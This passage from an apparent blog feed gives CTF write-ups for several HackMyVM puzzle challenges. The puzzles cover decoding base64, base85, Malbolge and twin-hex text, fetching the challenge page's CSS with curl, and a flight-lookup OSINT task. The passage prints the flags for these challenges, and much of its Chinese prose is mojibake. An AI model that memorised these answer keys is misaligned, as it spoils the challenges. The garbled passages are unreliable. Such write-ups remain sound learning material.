console.log(flag);
```

![image-20250526141745643](https://7r1umphk.github.io/image/20250526141745824.webp)

Flag: `HMV{h3ll0_fr0m_3l3c7r0n}`

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%2020250526.html</guid><pubDate>Fri, 27 Jun 2025 09:30:02 +0000</pubDate></item><item><title>Challenge 052</title><link>https://7r1UMPHK.github.io/post/Challenge%20052.html</link><description>![image-20250622182158981](https://7r1umphk.github.io/image/20250622182159297.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 052.zip                                                            
Archive:  052.zip
 extracting: 052.png                 
  inflating: 052.txt                 
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 052.txt 
Good morning agent X,
You have been selected for another important mission.
You need to locate a persons flight and the airport were he arrived.
We were able to get the date from his cellphone, but it appears encrypted with some sofisticated technique,
Have a great hunt agent X,
Sh4dowExe

RCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1

P.S.
We, also, were able to retrieve this:
6tmc`F^ZgDA8*0&amp;i%-!lFWbX7EZf1:+ELt4F)N1CATVs2%178mA8*/sASl@'+Cf&gt;1DKU&amp;8+Cf&gt;-+D5_'DBNP&amp;EdD:J%16TYAKYf'+C\c$FD5&lt;(+CfG7A7]RoASuU$+Co1/Eb0?5D_;

I‚Äôm sure that with your capabilities you can solve it.                                                                                                                                                                                   
```

```
RCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1
```

ÊöÇÊó∂Áúã‰∏çÂá∫Êù•ÊòØ‰ªÄ‰πàÔºåÊàëËØï‰∫Ü‰∏ãXORÔºåÊó†Êûú

ÁÑ∂ÂêéÂ∞±Â∞ùËØïÈôÑ‰ª∂

```
6tmc`F^ZgDA8*0&amp;i%-!lFWbX7EZf1:+ELt4F)N1CATVs2%178mA8*/sASl@'+Cf&gt;1DKU&amp;8+Cf&gt;-+D5_'DBNP&amp;EdD:J%16TYAKYf'+C\c$FD5&lt;(+CfG7A7]RoASuU$+Co1/Eb0?5D_;
```

ÊòØbase85

![image-20250622205039316](https://7r1umphk.github.io/image/20250622205039860.webp)

```
Âú®ËøôËæπÔºåÂú®ÈÇ£ËæπÔºåÂú®ÈÇ£Èò¥Ê£ÆÁöÑÂ≤©Áü≥‰∏äÔºå
ÊàëÁúãËßÅÈïøÁùÄËßíÁöÑÈ≠îÈ¨ºÔºåÊâãÈáåÊãøÁùÄÂ∑®Â§ßÁöÑÈû≠Â≠êÔºå
Âú®ÂêéÈù¢ÊÆãÂøçÂú∞Èû≠ÊâìÁùÄ‰ªñ‰ª¨„ÄÇ
```

ËøôÊÆµÊñáÂ≠óÂá∫Ëá™‰ΩÜ‰∏ÅÁöÑ„ÄäÁ•ûÊõ≤„Äã‰∏≠ÁöÑ„ÄäÂú∞Áã±ÁØá„ÄãÔºåÂÖ∑‰ΩìÊòØÁ¨¨ÂçÅÂÖ´ÁØáÁöÑÂá†Ë°åËØóÂè•„ÄÇ

ÂêéÈù¢ÊâíÊãâ‰∫ÜÂæà‰πÖ

ÁÑ∂ÂêéÁªà‰∫éÂèëÁé∞‰∫Ü

```
RCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1
```

ÊòØbase64
Ëß£Âá∫

```
D'`A^?]\I;{FWVwS4Qtr0`ooJl7Z''DDBBARaa_u)y[Zvotm3qSi/mleMiha'e^c\'!_^@\[TSwW9ONMLpJOHlFKDCg*@d&gt;=B;@?8\654X816543,P*)Mnm%IH5
```

ÁÑ∂ÂêéÊêúÁ¥¢dante's inferno cipherÔºà‰ªéÈôÑ‰ª∂‰∏≠ÂæóÁü•ÁöÑ‰ø°ÊÅØÔºâ

‰Ω†ËÉΩÊâæÂà∞ËøôÁØáÊñáÁ´†
https://bitvijays.github.io/Series_Capture_The_Flag/LFC-Cryptography.html#esoteric-programming-language
![image-20250622210908861](https://7r1umphk.github.io/image/20250622210909127.webp)

![image-20250622210925792](https://7r1umphk.github.io/image/20250622210926182.webp)

ÊâÄ‰ª•ÊàëÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ãËøôÁßçÁºñÁ®ã

https://malbolge.doleczek.pl/

ÊâæÂà∞Ëøô‰∏™

‰∏ÄËøêË°å

![image-20250622211002462](https://7r1umphk.github.io/image/20250622211002853.webp)

```
10:11:2023:14:00
```

ÂæóÂà∞‰∏Ä‰∏™Êó∂Èó¥

ÁÑ∂ÂêéÂ∞±ÂæÄÂâçÊé®‰∫ÜÔºåÊâæÈÇ£‰∏™ÂõæÁâáÁöÑ‰ø°ÊÅØ

![052](https://7r1umphk.github.io/image/20250622211439549.webp)

ÂãâÂº∫ÊÅ¢Â§ç‰∫Ü‰∏Ä‰∏ã

Áõ¥Êé•googleÊó†Êûú

ÁúãËÉΩ‰∏çËÉΩÈÄöËøáÊó∂Èó¥ÂèçÊé®Âêß

(Â∞ùËØï‰∫ÜÂæà‰πÖÔºåÊ≤°ÊúâÁªìÊûúÔºåÊöÇÊó∂ÊêÅÁΩÆ)

ÂêéÈù¢ÈóÆ‰∫ÜÁæ§ÈáåÁöÑÂ§ß‰Ω¨Ôºå‰ªñ‰ª¨ËØ¥ÊòØÁªøËÄÅÂì•Áªô‰∫Ü‰∏Ä‰∏™ÁΩëÁ´ôÊâæÂà∞ÁöÑÔºåÊàë‰πüÊâíÊãâ‰∏çÂà∞ÊâÄ‰ª•ÂÖàÊãøflag‰∫§‰∫Ü

```
HVM{Porto-OPO-Eindhoven-EIN-FR7472}
```

ÈóÆÂà∞‰∫Ü

https://www.flightera.net/zh/flight/Ryanair-Porto-Eindhoven/FR7472/Oct-2023#flight_list

Âà©Áî®Ëøô‰∏™ÁΩëÁ´ôÔºåÊàë‰∏çÂÅö‰∫ÜÔºåËá™Â∑±ÊÉ≥ÊÉ≥ÊÄùË∑ØÂêßÔºâ

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20052.html</guid><pubDate>Fri, 27 Jun 2025 09:29:59 +0000</pubDate></item><item><title>Challenge 051</title><link>https://7r1UMPHK.github.io/post/Challenge%20051.html</link><description>![image-20250622181457506](https://7r1umphk.github.io/image/20250622181505010.webp)

```
2zx42j1ji5x05cj64f2lt5zc56a6w0
```

CyberChefËØÜÂà´‰∏ç‰∫ÜÔºåÂ∞±ÊòØÊÑèÊÄùÊòØ‰∏çÊòØÂ∏∏ËßÅÁöÑ

dcodeÊòØÊúâ‰∏Ä‰∏™ËØÜÂà´ÂØÜÁ†ÅÁöÑÂäüËÉΩÁöÑÔºåËØïËØï

https://www.dcode.fr/cipher-identifier

![image-20250622182033016](https://7r1umphk.github.io/image/20250622182033489.webp)

https://www.dcode.fr/twin-hex-cipher

![image-20250622182054951](https://7r1umphk.github.io/image/20250622182055419.webp)

```
HMV{4noth3r_C1pher}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20051.html</guid><pubDate>Fri, 27 Jun 2025 09:29:57 +0000</pubDate></item><item><title>Challenge 050</title><link>https://7r1UMPHK.github.io/post/Challenge%20050.html</link><description>![image-20250621131043433](https://7r1umphk.github.io/image/20250621131043717.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/                
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:54:19 GMT
Content-Type: text/html
Content-Length: 317
Last-Modified: Sun, 02 Jun 2024 17:47:47 GMT
Connection: keep-alive
ETag: '665cb043-13d'
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;title&gt;HackMyVM - Sertor&lt;/title&gt;
    &lt;link rel='icon' href='logo.png' type='image/png' sizes='16x16'&gt;
    &lt;link href='index.css' type='text/css' rel='stylesheet'&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p id='smoothkeyset'&gt;
    THIS LOOKS SO CLEAN!
&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
 
 ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/logo.png                                              
HTTP/1.1 404 Not Found
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:57:21 GMT
Content-Type: text/html
Content-Length: 153
Connection: keep-alive

&lt;html&gt;
&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/index.css
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:57:39 GMT
Content-Type: text/css
Content-Length: 451
Last-Modified: Sun, 02 Jun 2024 17:48:30 GMT
Connection: keep-alive
ETag: '665cb06e-1c3'
Accept-Ranges: bytes

body
{
    background: rgb(123, 0, 128);
    background: linear-gradient(90deg, rgba(123, 0, 128, 1) 0%, rgba(205, 0, 187, 1) 34%, rgba(255, 0, 134, 1) 68%);
}

body #smoothkeyset
{
    position: absolute;
    right: 45vw;
    top: 45vh;

    color: white;
    font-family: 'Lucida Sans', 'dGhpc2lzbXlrZXkuY3NzLnR4dA==', sans-serif;
    font-size: large;
    font-style: italic;
    text-decoration: white underline solid 6px;
    cursor: default;
}

                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo dGhpc2lzbXlrZXkuY3NzLnR4dA== |base64 -d
thisismykey.css.txt                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/thisismykey.css.txt
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:57:57 GMT
Content-Type: text/plain
Content-Length: 20
Last-Modified: Sun, 02 Jun 2024 17:48:38 GMT
Connection: keep-alive
ETag: '665cb076-14'
Accept-Ranges: bytes

HMV{wonderfulltext}
               
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20050.html</guid><pubDate>Fri, 27 Jun 2025 09:29:54 +0000</pubDate></item><item><title>Challenge 049</title><link>https://7r1UMPHK.github.io/post/Challenge%20049.html</link><description>![image-20250621130059885](https://7r1umphk.github.io/image/20250621130100186.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 049.zip 
Archive:  049.zip
  inflating: ourobouros              
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat ourobouros
iVBORw0KGgoAAAANSUhEUgAAAysAAACJCAYAAAAsa6ckAAAABHNCSVQICAgIfAhkiAAAHhZJREFU
eJzt3Wd4FHX79vFzQxIhEBANYKEooIKgWKgWBIIEQifSpEkv0gNJKCpKS4j0EkJNQi/SEpLQu3or
KthvBelgAYLSU58X/uOjN0gyIZOd3f1+jsMXZufKXsPsZPfcnf1dtoyMjAwBAAAAgMW42bsBAAAA
ALgdwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKs
AAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAA
SyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoA
AAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAk
wgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgpMtW//AS1ZtkKp
qan2bgWAC/jhxyMKnTTZ3m0AyGNRMUu0d99+e7cBE9gyMjIy7N0EnFNaWpoaNWmhI0ePqly5shoZ
HKS6dWrbuy0ATuj8hQuaNn2WVq5eo/T0dM2dPUMNXq1v77YA5IHTp8+ovp+/klNS9ErtlzUyZLge
K1/e3m0hl9gtrKSlpWnWnLn2uOtcVbNGddWoXs3ebVjS8pWrNPrtd//xsxdfqKVRIUGqUOEJO3Vl
Dld7PGe1v6/UfknPVKmSm63ZlavtryO5efOmFkcv0ZyISF25evWvnz/6SBltiY+Vu7t7lr/D1c7f
EydPasPG2DzoyFyvtWqphx9+KMvtXG1/HcXZc+e0Zu26f73dyP4OHBKouM0Jf/2/m5ub2rdto8GD
+uv+++67616txBUfz1n/FTdJWlqaps+cba+7z1XZeXJITU11iv19oVZN1apZI8vtrl69pmnTZ93y
8wMffqTGzVupTesABQ4eKB8fHzPazHOu9njOan8LF/Z2qhfvrra/jiJuc4LCwifrzNmzt9x27PgJ
LV+5Wp07vp7l73G18/fEiZNOsb81a1TPXlhxsf11FGfPnrvjccnu/h7+8qt/BBVJSk9P17IVK7Vx
U6ze7NdHXbt0kqen5133bAWu+Hi2W1hxNWlpaZodEWnvNu6au7t7tsJK5PwFOn/hwm1vy8jI0KrV
axUbF6++vXuqe9cuyp8/f263CsBJfXHosMaOD9Whw4fvuN30mbPUqkUzFSpUKI86A5DXJoaF/+tt
V65eVVj4ZC1dvkIhwwPV2L9RHnaG3MIX7JHrfvnlVy1YFJXldteuXdPkqdPl28BfG2PjxNenANzJ
6dNnNHBIoALatM8yqEhSUtIlRUQuyIPOANjDtu079MmnB7Pc7syZsxow+M+/HV8cyvpvB6yFsIJc
t2TZct24cSPb25/7+WcNCQxSq9btdPCzz03sDIAjunzliia9P0X1/fxvudwjK0uXr9C1a9dM6gyA
PUXOX2ho+y8OHVZAm/YaNHSYzpy59fJRWBNhBblu8MD+evedt1S06L2G6g5/+ZXatO+o/gOH6OSp
UyZ1B8BRpKWlafnKVapXv6Hmzlug5JQUQ/V+Deordv1aeXl5mdQhAHtaOC9C3d7onK2FNP4uNi5e
vn7+Cp889R8Lc8CaCCvIde7u7urUob12b9+inj26ydPDw1B9fOIWNWjYRBMnva/Lly+b1CUAK9u7
b7/8m7bU6Lff1YWLFw3VVq70pFYui1HErBkqXbqUSR0CsLciRYpo9MgQbU2INbxUeXJysiIi56uu
r59WrFyttLQ0k7rE3bLsF+xtNpvc3KyRpXgA54y3t7dGBA1Th/ZtFTZpshK2bM12bXJKiuYvWKS1
H6zT4IED1L5ta8PvnFiJlR7Pd+IIPcK5/fDjEU0InZSj4W4lShTX8KFD1LJFM9lsNkO1+fLlM3x/
9pAXz0dubm6G//3sIbd6tMr+ZmRkKD093d5tOKRHypTR3Nkz9J9PPtW4CaH65tvvsl174eJFjXp7
jKKXLNXIkCDVfvklEzs1n1Uez1kx0qNlX/2NHhmsrl0627sNSdJjFZ8y/QnCw8PD0i/GMx9SHgY/
JZGk0qVKafbMafr04GcaPzFMX371dbZrk5Iu6Z13xypm6TKHHipppcczYEXnL1zQ9BmztWLVasMv
2AoUKKBePbqpV49uKlCggOH79vT01I/ffWW4zh7y4vkodv1aVaxYwdT7sBKr7O/Bzz5Xm/Yd7d2G
Q6tRvZo2rV+rdes3KnzKVP3662/Zrv3hxyN6o3svhx8qaZXHc26y7qtjFxM8PFDd3nDuF7PVqj6v
9WtXacOmWIW/P1U///JLtmuPHv1J3Xv1cdqhkoCrSk5O1uLoJZo9Z67ha8dtNptatWyuYUMGq0SJ
4iZ1CMCR2Gw2BbRqoUYNG2jegkWat2CRoUV/9uzdp337DzjtUElHxDUfyFM2m00tmzfTzm0JGjp4
oOF3QTOHSo4Y/bbOnz9vUpcA8sLm+AT5+vkrLHyy4aBSvVpVbVy3RuGhEwgqAG7h5eWlwQP7a+e2
BLVs0cxQbeZQybq+foqcv1DJyckmdYnsIKzALvLnz6/+/fpo17ZEtQ5oZejaxcyhknXqN9TsiEhD
75gAsL/M5UMHDA40vHxomdKlNXf2DK1cFqPKlZ40qUMAzuKBEiU0eVKoNq5bo+rVqhqqzRwq6evn
r83xxpZNR+4hrMCuihcvprCJ4xS7Ya1q1axhqJahkoBjOXPmrAYNHZajwWyFCxfWqBHBOVr1BwCe
qlzpr1UCy5QubaiWoZL2RViBJTxZsaKWxSzWvIhZevSRMoZqGSoJWNvlK1cUPnmqfP38FRsXb6g2
X7586typg3Zv36LuXbvkaJEPAMjk16C+tiTEamRIkLy9vQ3VMlTSPggrsJT6vvWUuHmT3hoVoiJF
ihiqZagkYC1paWlasXK16tVvqIjI+Yav+/atW0dbNm/SmLdG6d57jf09AIB/4+nhoR7d3tDu7VvU
uePrhpcuZ6hk3iKswHI8PDzUtUtn7d6eqK5djE+mZagkYH+ZQx1HvT3G8FDHChWe0NLoRZofOUdl
yz5qUocAXF3RovdqzNujlRi3UfXqvmKolqGSeYewAssqUqSI3hoVoi3xsarvW89QbeZQyTr1/bRk
2Qqlpqaa1CWAv/vhxyPq2qO33ujeSz8eOWKo1sfHRxPHj1Xchg/0Qq2aJnUIAP9UrlxZLYiMUMzi
harwxOOGajOHSjZu1lL79h8wqUPXRliB5T36SBnNi5ilZTGL9WTFioZqM4dKNmraQrt27zWpQwAX
Ll7UW++8J/+mLbRn7z5Dtffcc4/e7Ntbu7Ylqm3rALm58dQEIO+99GItxW1cp4nj3pPP/fcbqv3h
xyPq0q2nuvbobfiNGtwZzwhwGLVq1tCm9WsUNnGcihXzMVSbOVSyc9fu+v6/P5jUIeB6kpOTFTl/
oer6+mnZipWGp883b9pEO7bGK3DIIBUs6GVSlwCQPW5ubmrb5jXt2r5F/fr0kqenp6H6PXv3qVGT
FnrrnfcMXwKL2yOswKG4ubmpdUAr7dqWqAFv9lX+/PkN1e8/8JEaN2vJUEkgF9zNUMfnn3tW69es
1NTJk/TQgw+a1CEA5EzBgl4aNnSwdmyNV7MmjQ3VMlQydxFW4JC8vLw0ZNAA7dgar5bNjU2m/d+h
kjdv3jSpS8A53c1Qx5IlH9as6VO0ZuUyVanytEkdAkDuePihhzRtSrjWrVmhZ5+pYqiWoZK5g7AC
h/bgAw9ocnioNnywWtWqPm+olqGSgDF3M9SxUMGCCh4eqO2Jm+XfqKFJHQKAOZ6pUkUfrF6hmdMm
6+GHHzJU+/ehkocOM1TSKGNrwjqIi0lJ2rf/gM6d+1ne3oVUuVIlVXn6KXu3BRM9/VRlrVq+RAlb
tip00vs6dep0tmvPnjunIYFBiopeolEjglX1+edM7BRZcbXz1xH29/KVK5obOV8LF0cbvpzBzc1N
7du20eBB/XX/ffeZ1KF1OcLxRc4dO3Zcn3x6UBeTkuTjc79qVq+uUqVK2rstmKixfyO9Wt9Xi6Ji
NCci0tAlsF8cOqxWrduraRN/BQUONRx6XJVThZXklBRNnzFLkfMX3vIlz3Llyuqd0SP10osv2Kk7
5IVGfg3kW6+uomOWatacuYbmrGQOlfRv6Keg4UNVulQpEzvF/3K189cR9jctLU2r13ygKdNm5OiL
orVffkkjQ4L0+GPlTejO2hzh+CLnzp8/rxGj39GOnbtuua1O7Zf19uiReuSRMnboDHnB09NTfXr1
0GsBLTVt+iytXL3G0OIisXHx2rJ1u7p37aK+fXqpUMGCJnbr+JzmMrAzZ8+qRavWioicf9sHzNGj
P6lz1x6Killih+7Mk5ycrFlz5qrt65309LPV5Ovnr0FDh+m77763d2t24+nhoZ7du2rX9kR16tDe
8GRahkrmPVc7fx1hf+9mqONj5csrauE8RS2c55JBxRGOL3LuwIcfya9xs9sGFUnavXefmge00cHP
Ps/jzpDXfO6/X+Pee0fxsRv08ksvGqplqGT2OUVYSU9PV+DwkGwtSTtuQpgOf/lVHnRlvpOnTqlJ
8wBNmTZDnx78TFeuXtWxY8cVGxev5gFttCgqxt4t2tV9RYvq3XfeUkLcBtWtU9tQ7d+HSi5bscqk
DiG53vlr9f09fuJEjoc63le0qMa++7biY9er9ssvmdShtVn9+OLunD9/XgOHBCop6dIdt7t8+bIG
DR3GG14u4vHHyit60XwtXhCp8uXKGar9+1DJj//ziUkdOjanCCsLF0Xpk08PZmvb9PR0DQseoeSU
FJO7Mld6erqGDgvWkaNHb3t7amqqxk8M44tcksqXK6eF8+YqZvECPfH4Y4Zqk5IuKXzyFJM6g+R6
56/V9zdxyzbDQx09PTzUu2d37dqxRR3atzP8aaYzsfrxxd0JHjk6y6CS6dy5nzVuQpjJHcFKXqn9
shLiNui9MW/pvqJFDdX+8OMRRUXzaevtOHxYycjI0MKoaEM1R4/+pH37D5jUUd6IT9iiz784dMdt
MjIyFBbOC+1ML734guI2rtOEse8ankwLc7ja+euM++vfqKG2b4lX8PBAeRcqZO927MoZjy/+v59+
OqZdu/caqlm3YaN+//13kzqCFeXLl08dX2+vXdsT1atHd3l6eNi7JYfn8GHl+ImT+vXX3wzXHTz4
mQnd5J2sgkqmr77+hiV5/yZfvnxq17a1dm5PVO+e3e3djstztfPXmfa3whOPa83KZZo1fYpKlnzY
3u1YgjMdX9wqu5+Y/V1aWpoOHf7ShG5gdd7e3goJCtS2xM2qV/cVe7fj0Bw+rCQlJeWwLnsf41rV
yVMns7XdtWvXdOHCBZO7cTzffvudDnz4kb3bcHmudv460/4eP3FS+/Yf0LVr1+zdimU40/HFrS7m
8PjmtA6OLz09XR9/8om++vobe7fi0Bw+rBTz8clRnY+PY18GVK5s2Wxt5+3tLZ8c/hs5oxMnT6pv
/4Fq16Gzvv7mW3u34/Jc7fx1pv29ceOGZsyao3oNGmntuvWGlu10Vs50fHGrYsVydnxz+riAY/vo
4/+oacvXFDxitH777by923FoDh9WSpUqmaOhOjVr1DChm7yT3Wntzz37jMmdOIY//vhDE0InqUGj
ptqydbuh2nxurvtlYbO52vnrCPubz83Y08Kvv/6moJBRataytT76+D8mdeUYHOH4Iudq5eA4eXp4
6JlnqpjQDazq2LHj6tW3vzp07mp4jISbCy9OcicOH1YkqX+/voa2r/L0U6pVs7pJ3eSN+r719Ert
l++4jYeHh0YED8+jjqwpNTVVMUuWqU59Py1YFKUUg6vuvFrfVx+sXmFSd5Bc7/y1+v52faOzxrw9
WkWL3muo7tvvvlOHzl3Vu98AHTt+wqTurM/qxxc5V7Lkw2rRrKmhms6dOjDwz0VcuvS73hs3UX6N
m2n7jp2Gaj3+bz5c2ISxJnXn2JwirLRtHSDfenWzta2np6feD5voFEtrhoeOV/VqVW97W6GCBTUp
dLxLDmTLtHPXHjVs0lxjxo7XpUvGVmOp9GRFrVgarcg5M5lCbDJXO3+tvr/u7u7q3PF17dqWqJ7d
u8rD4Eo227bvkJ9/U40dH+qSqyBZ/fji7rz7zmg99OCD2dq2XNmyChwyyOSOYG8pKSlaHB2jOvX9
FBWzRKmpqYbqG/k10LbEOI0IHi5vb2+TunRsThFWJGnSxPF68YVad9zGw8NDk0LHq1y57H3fw+p8
fHy0Ymm0wiaOU5PGjVS+XDnVqllDPbt3VWL8JjVv2sTeLdrF99//Vx27dFOP3n3100/HDNWWKFFc
4aETtGn9WtWoXs2kDvG/XO38dYT9LVy4sEYED9e2xDg18mtgqDY1NfX/nrwbanF0jOFPNB2dIxxf
5Iy3t7fmzpmp0qVK3XG7EsWLa9aMKbrnnnvyqDPYw59vzjTT2PGh+uOPPwzVVnn6Ka1esVSzZ07L
8vHk6pwmrBQteq9iFi/QmLdG3TaZvlCrptatWalmTRrboTvz2Gw2tQ5opRlTJ2trQqyWxSzWiODh
2X7nx5n89tt5jRj1lho3b6UPP/rYUG2BAgU0aMCb2rk1QQGtWshms5nUJW7H1c5fR9rf0qVKafbM
aVq1fImefqqyodrff/9dY8eHqmEOLotwZI50fGFc5UpPKj52vV5v11bu7u7/uM3Tw0NtWgcodsMH
euLxx+3UIcz29Tffqn3HLurdb4COnzB22euDDzygKe+Had2alar6/HMmdehc3LPexHHYbDZ17tRB
7dq10RdfHNLZc+dUqGBBVa5cSQ8+8IC924NJbty4oYWLoxUROd/wMqo2m02tWjbXsCGDVaJEcZM6
RHa42vnraPtbrerzWr92lTbGxin8/ak69/PP2a49dvyEevXtr5o1qmvUiGBVerKiiZ1ag6MdXxjj
5eWlce+9o+GBg/XFocNKSrqk+++/T88++4zLD0d1Zr/88qsmT52uD9ZvMDzDzsvLS3169VCPbm8o
f/78JnXonJwqrGTy9PDgEh4XkJGRoU1xmzUpfIqhF06ZalSvptEjQ1zihZMjcbXz15H212azqUWz
pmrY4FUtWBSlufMWGHqD4OP/fKJmLV9TQMsWGjZ0sIoXL2Zit9bgSMcXxhUpUkR1Xqlt7zZgsuvX
r2v+wsWKnL9Q169fN1Rrs9nU5rVWGjp4UI6Xv3Z1TnMZGFzLwc8+V8vX2mpIYJDhoPJImTKKnDNT
K5ZGE1SAHMifP7/69+ujXdsS1bZ1gKHLJjMyMrR23XrVfbWhZs6OMPzEDwB5JSMjQ+vWb1S9Bo00
bcYsw3+vXnyhljZvXKeJ48cSVO4CYQUO5dSp0+o/aKjatO+oL7/62lBtkSJF9NaoEG2J36RX6/ua
1CHgOooV89HE8WO1eeO6LL9Q/r+uX7+uqdNnyreBv9Zv2GT4kgoAMNMnnx5U81atNSx4hH755VdD
tWXLPqoFkRFaErVQFSo8YVKHrsMpLwOD87l8+bJmR8xTVHSMkg2uLOTu7q5OHV7XwP59VaRIEZM6
BFxXhQpPaEnUQu3ctUcTwiYZWoXv519+UWBQiKJilmjUiOB/XY4dAPLC8RMnFBY+2fAAaenPxTUG
Deiv19u1uWXxBeQc/5KwtLS0NK1cvUZTp83UxaQkw/Wv1vdVSNAwPcqsFMB09eq+otovv6jlK1dr
+sxZSkq6lO3ar77+Ru06dFZDv1cVPDxQZUqXNrFTAPinP/74QzNnRyhm6XLDy617eHjojc4d1b9f
H2almICwAsvas3efxk+cpCNHjxqurfRkRY0eGcIXW4E8ljlUskWzJpodEamomKWGnvgTt2zTjp27
1aVTB/Xv10eFCxc2sVsAri41NVXLV6zStJmzDA+Qlv4c6hgcFMisFBPxnRVYzn9/+FGdu/ZQ1x69
DQcVhjoC1nA3QyVTUlK0YFGU6tT3U8zS5YYnQgNAduzYtVt+jZtpzNjxhoPK009V1qrlSxjqmAf4
ZAWWcf7CBU2bPksrV69Renq6odoCBQqoV49u6tWjmwoUKGBShwCMyhwq+enBzzR+YpihhTEuXfpd
Y94bp5ilyzQyOEj16r5iYqcAXMV3332v8aGTDA+Qlv4c6jh82BA1b9qEAdJ5hLACu7t586YWRy/R
nIhIXbl61VAtQx0Bx3A3QyV/+umYevTuqxdfqKVRIUGsrgMgR3777bymTJuu1WvXMdTRgRBWYFdx
mxMUFj5ZZ86eNVzLUEfAsdztUMkDH36kxs1bqU3rAAUOHigfH+YWAMjajRs3cvQ3R2KooxXwnRXY
xReHDiugTXsNHBJoOKgw1BFwbHc7VHLV6rWqU7+hZkdE6ubNmyZ2CsCRZWRkaGNsnHwb+GvKtBmG
gwpDHa2BsII8debMWQ0aOkwBbdrri0OHDdUy1BFwLn8fKvlCrZqGaq9du6bJU6fLt4G/NsVtZqgk
gH84+NnnavlaWw0JDDJ02anEUEer4TIwi9h/4EPDid8eqlermqOhbVeuXlXE3HlauDhaycnJhmoZ
6gg4twoVntDS6EU5Gip59tw5DR46XIujYjR6ZIief+5ZEzsFYHWnTp1WWPhkxSduMVzLUEdrsuyR
OPDhR7p509iLWrMYXZkqJ3bv2avde/aafj93a9CANw2FlbS0NK1Zu05Tps3Q+QsXDN8fQx0dk5XO
3zupVvU5Pf/cc3f9e1xtf83y11DJHMw8OPzlV2rdroP8GzVU8LChKlWqZLZr09LSNH/h4py0nOfy
4vnI1az+YJ1KFLf/Ai2nT5/Jld9z6tRpbU5IzJXfZabc2t9Mly9f1uyIeYqKjlEyQx2dimXDys5d
e7Rz1x57t4G7sG//AY2fGKYffjxiuJahjo7NUc7fQQPezJUX7662v2Zyd3dX504d1KJ5U82aM1fR
S5YZGioZn5Co7dt3qOsbndWvb295FyqUZU1aWpomvT/lbtqGA4uOWWrvFnLVsePHXerxnJqaqpWr
12jq9JlKSrpkuJ6hjtbHd1aQ644cPapuPfuoS7eehoMKQx0BSH8OlRwZEqStCbFq6PeqodrklBRF
zl+our5+WrZildLS0kzqEoA97d6zV/5NW+rtMWMNBxWGOjoOwgpy3a7dxi9pK1CggAYNeFM7tyYo
oFULBi0BkCSVKV1ac2ZO18plMXqqciVDtReTkjRnbqRSU1NN6g6APS1dvkJHjh41VPPgAw9oyvth
